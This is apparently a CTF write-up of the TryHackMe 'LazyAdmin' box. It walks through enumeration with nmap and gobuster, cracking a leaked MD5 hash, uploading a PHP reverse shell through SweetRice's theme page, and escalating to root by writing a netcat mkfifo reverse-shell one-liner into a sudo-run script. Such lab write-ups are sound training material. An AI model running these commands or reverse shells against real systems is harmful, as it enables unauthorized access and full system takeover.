# LazyAdmin

Description: N/A

After booting up my Kali Linux virtual machine and connecting to THM using OpenVPN, I started attacking the box. First, I started with scanning the server for any open ports of potential vulnerabilities.

## Enumeration/Scanning
`Server IPv4: 10.10.120.174`

I created a nmap directory where I placed the nmap scan that I ran on the host.
* `nmap -sV -sC -O -v 10.10.120.174 | tee nmap/initial`

**I discovered 2 open ports:**
* Port 22/tcp
	* Version: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
* Port 80/tcp
	* Version: Apache httpd 2.4.18 ((Ubuntu))

I was unable to find any other useful information using nmap. Now that I know the server is hosting a website, I decided to pursue this as a possibility to discover a vulnerability. All that I could see is the default Apache webserver index page as shown below:
* ![Pasted image 20230404224447](https://user-images.githubusercontent.com/28494055/229980819-f2d5614b-c47a-466b-afd6-d8abcc35aec6.png)

Knowing the server is hosting a website, I know I could use a directory buster tool to find any potential directories that I could explore. For this scenario, I used GoBuster.
* `gobuster dir -u http://10.10.120.174 -w /usr/share/dirb/wordlists/common.txt -o gobuster/initial`
* ![Pasted image 20230404225030](https://user-images.githubusercontent.com/28494055/229980800-59b44d72-b367-4ff6-9853-826aa15c53f6.png)

We can see that there is a content page, and the index.html page we originally looked at. Checking out the content page, I found that the server is using SweetRice, a Content Management System.
* ![Pasted image 20230404225400](https://user-images.githubusercontent.com/28494055/229980734-6885650b-a297-46c0-b918-37e96fccaae1.png)

I did not find anything else that could be useful, so I decided to continue the enumeration process with gobuster and scanned the content directory for any additional information I could use.
* `gobuster dir -u http://10.10.120.174/content -w /usr/share/dirb/wordlists/common.txt -o gobuster/content`

I found multiple additional artifacts I could investigate. 
* ![Pasted image 20230404225552](https://user-images.githubusercontent.com/28494055/229980670-c9eb6ea2-8a51-4df0-bcd2-a001cddab3dc.png)

After looking around the theme's directory, I found that the server is using php. This can be useful later. I did not find anything else that could be useful here. Next on the list is /as. I discovered that this is a login page for sweet rice, something I may be able to exploit later. /Attachment was empty, /images did not provide anything useful, then I came up to /inc. Right away I can see that there are 4 folders, cache/, font/, lang/, and mysql_backup/. 

Great, now I know that the server is using mysql as a database. Checking this folder I found a bakup copy. Before continuing, I checked the remaining directories for any additional information that I could use and found nothing.
* ![Pasted image 20230404230322](https://user-images.githubusercontent.com/28494055/229980643-d76a83ad-d4f6-4391-9d7c-b12c3fe27cbd.png)

I downloaded the mysql bakup file and began investigating its contents. I found that there are multiple potential usernames within the file, and a hash. I used grep to highlight the keywords to make it easier on the reader.
* ![Pasted image 20230404231002](https://user-images.githubusercontent.com/28494055/229980625-a13a6f9b-9988-4f52-bf4d-0a02d8700288.png)

The first thing I thought of in regard to the hash is I could possibly crack it. I will be using John to crack the hash.
* `mkdir john`
* `echo "42f749ade7f9e195bf475f37a44cafcb" | tee john/hash.txt`

I used hashid to discover the type of hash we are dealing with.
* `hashid -emj john/hash.txt`
* I was able to determine that the hash was created using an MD5 algorithm as shown: 
* ![Pasted image 20230404232427](https://user-images.githubusercontent.com/28494055/229980607-280db0a2-2b4f-4f54-9a84-f054837d6625.png)

Now that I know the type of hash it is, I can use john to crack the password.
* `john --format=Raw-MD5 john/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
* ![Pasted image 20230404233737](https://user-images.githubusercontent.com/28494055/229980582-c2af2d60-4bc9-49e2-b69c-2291f8e8ffa8.png)

**I cracked the hash and got the password, "Password123"**

I then attempted to login using this password and the different usernames I discovered earlier and logged in using manager.

## Exploitation
After logging in, I investigated the admin page looking for anything that could help me with getting access to the server. The first thing I found that may help me is the theme page. In this page, I'm able to upload a file to the server, and it would appear in the /content/theme directory. I may be able to run a reverse shell here using PHP, which we discovered the server to be using.

For this scenario, I will be using [pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell).

I used nano to create a php file and placed the reverse shell script inside of it. I then edited the script's default IP address and port number. When the script is run on the server, it will attempt a connection to my IP address on the port I specified. Before placing the script within the theme upload page, it states that I need to zip it. After zipping the file I placed it in my /tmp directory, and then I uploaded it to the website. I started a netcat listening session on port 1127 and then executed the reverseshell on the /theme page of the website.

I'm in!
* ![Pasted image 20230404235109](https://user-images.githubusercontent.com/28494055/229980553-f12be249-09c4-4ffb-bd0b-8a81d57bce75.png)

The first thing I did after receiving access was look for the user flag. I found the home directory of itguy, where the user.txt file containing the flag lies.
* ![Pasted image 20230404235318](https://user-images.githubusercontent.com/28494055/229980534-f258ea57-be4b-42c5-8d35-bc45f2687ad6.png)

## Privilege Escalation
Next, I need to figure out how to privilege escalate to root to find the last flag needed to pwn the box.

The first thing you usually do is check the sudoers file for any possible users or files I could exploit.
* ![Pasted image 20230405000050](https://user-images.githubusercontent.com/28494055/229980484-efe5f6ee-952a-4109-9e06-c76035418573.png)

You can immediately see that there is a script running on perl with sudo privileges, that does not require a sudo password to run. backup.pl is running a shell script called copy.sh as seen below:
* ![Pasted image 20230405000207](https://user-images.githubusercontent.com/28494055/229980462-24d82ccd-b1b2-4b62-b37a-25fd555d34f1.png)
* ![Pasted image 20230405000235](https://user-images.githubusercontent.com/28494055/229980442-5741b5b8-bf96-4a2f-9bab-1ca84b1b5a3f.png)

You can tell just by looking at it that it is a reverse shell, because of the netcat command sending out a connection to IP 192.168.0.190 on port 5554. If I can edit this to use my own address, I could potentially reverse shell onto the system as root. I tried using nano, vi, vim, but was unable to edit the file. The next thing I did was echo the line with my own address and port and output it into the copy.sh script.
* `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.57.33 1128 >/tmp/f" > /etc/copy.sh`

I then started netcat on another terminal listening on port 1128. I ran the backup.pl script, allowing me to connect to the server as root.
* `sudo perl /home/itguy/backup.pl`

## Post-exploitation
I then navigated to root's home and found the last flag. Pwned!
* ![Pasted image 20230405001019](https://user-images.githubusercontent.com/28494055/229980090-b2e9e7d7-b21a-494e-9529-8fcfdcb229a6.png)
